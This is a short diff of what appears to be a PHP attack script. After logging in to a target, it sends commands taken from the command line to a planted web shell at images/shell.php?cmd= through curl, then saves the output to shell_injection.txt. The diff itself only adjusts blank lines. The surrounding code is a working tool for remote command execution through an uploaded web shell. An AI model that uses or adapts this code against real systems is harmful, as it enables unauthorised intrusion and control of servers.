@@ -85,8 +85,6 @@ if(curl_errno($curl)){
 	echo "Successful Login!\n";
 }
  
-
-
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
 $shellcmd = $argv[3];
 echo $cmd.$shellcmd; 
@@ -96,6 +94,7 @@ $result_txt = "-------------------------------------------------------------\n".
 			"Result:\n".
 			"----------------\n".
 			$result;
+			
 echo $result_txt;
 
 $resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
